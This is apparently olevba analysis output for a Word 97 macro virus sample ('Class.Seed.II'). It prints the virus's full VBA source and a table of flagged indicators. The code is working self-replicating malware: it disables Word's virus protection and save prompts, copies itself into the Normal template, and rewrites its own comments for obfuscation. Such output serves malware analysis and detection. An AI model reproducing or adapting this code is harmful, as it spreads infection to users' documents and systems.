olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.y-02babd7d541df70465a47f7b01c3815fe186ef53
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.y-02babd7d541df70465a47f7b01c3815fe186ef53 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'196512734896441025536196512734896441025536196512734896441025536196512734896441025536
Randomize
'4103865640055531865104410386564005553186510441038656400555318651044103865640055531865104
x = 0: o = 0
'1310498352955975301281131049835295597530128113104983529559753012811310498352955975301281
On Error GoTo 93
'196784784002431180249196784784002431180249196784784002431180249196784784002431180249
Options.VirusProtection = False
'71432718361494528644714327183614945286447143271836149452864471432718361494528644
Options.SaveNormalPrompt = False
'6813509472939709728529681350947293970972852968135094729397097285296813509472939709728529
Options.ConfirmConversions = False
'269990905961269425641269990905961269425641269990905961269425641269990905961269425641
fx = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'1176668366767454940964117666836676745494096411766683667674549409641176668366767454940964
xf = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'8059637102548551478336805963710254855147833680596371025485514783368059637102548551478336
If xf > 96 And fx > 0 Then GoTo 93
'884687689693336448644884687689693336448644884687689693336448644884687689693336448644
If xf < 96 Then
'789216649005652934596789216649005652934596789216649005652934596789216649005652934596
    Set xs = NormalTemplate.VBProject.VBComponents.Item(1)
'9055826304153636244025905582630415363624402590558263041536362440259055826304153636244025
    ActiveDocument.VBProject.VBComponents.Item(1).Name = xs.Name
'3240072000410512811024324007200041051281102432400720004105128110243240072000410512811024
    ActiveDocument.VBProject.VBComponents.Item(1).Export Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'489586427567680769600489586427567680769600489586427567680769600489586427567680769600
End If
'2854871761183765136285487176118376513628548717611837651362854871761183765136
If fx = 0 Then Set xs = ActiveDocument.VBProject.VBComponents.Item(1)
'12662281728117977600126622817281179776001266228172811797760012662281728117977600
k = Int(Rnd(1) * 100) + 1
'417523835563439587904417523835563439587904417523835563439587904417523835563439587904
If k = 99 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.cannabisculture.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'63140130729560458276631401307295604582766314013072956045827663140130729560458276
l = Int(Rnd(1) * 75) + 1
'569805544363382469281569805544363382469281569805544363382469281569805544363382469281
If l = 74 Then ActiveWindow.WindowState = wdWindowStateMinimize: ActiveDocument.FollowHyperlink Address:="http://www.Microsoft.com", NewWindow:=False, AddHistory:=False, ExtraInfo:=Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(47) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'22990107048411641225229901070484116412252299010704841164122522990107048411641225
m = Int(Rnd(1) * 50) + 1
'6680053776420496503556668005377642049650355666800537764204965035566680053776420496503556
If m = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(80) + Chr(82) + Chr(79) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'9582182160114465113441958218216011446511344195821821601144651134419582182160114465113441
n = Int(Rnd(1) * 25) + 1
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If n = 24 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(67) + Chr(76) + Chr(65) + Chr(83) + Chr(83) + Chr(32) + Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(32) + Chr(73) + Chr(73)
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
xs.codemodule.AddFromFile Application.StartupPath & Chr(83) + Chr(69) + Chr(69) + Chr(68) + Chr(73) + Chr(73)
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For p = 1 To 4
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .deletelines 1
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    Next p
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If xf < 96 Then
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline 1, "Sub AutoClose()"
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline 99, "Sub ToolsMacro()"
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End If
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
With xs.codemodule
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For p = 2 To 44 Step 2
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    x = Int(Rnd(414835) * 403989) + 8485
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    o = Int(Rnd(298368) * 235865) + 2988
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline p, "'" & x * x & o * o & x * x & o * o & x * x & o * o & x * x & o * o
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Next p
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    For xp = 46 To 98 Step 2
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
    .replaceline xp, "'" & Application.Assistant & Application.DisplayRecentFiles & Application.FocusInMailHeader & Application.Build & Application.StartupPath & Application.ActiveDocument & Application.Version
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Next xp
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End With
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
93:
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
If xf > 98 And fx = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
End Sub
'The GeniusTrueFalse8.0.5622c:\program files\microsoft office\office\startupBooklist.doc8.0b
Sub ToolsMacro()
'Word97/Class.Seed.II by Virus :) Smile!
End Sub




+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.cannabisc|URL                                          |
|          |ulture.com          |                                             |
|IOC       |http://www.Microsoft|URL                                          |
|          |.com                |                                             |
+----------+--------------------+---------------------------------------------+

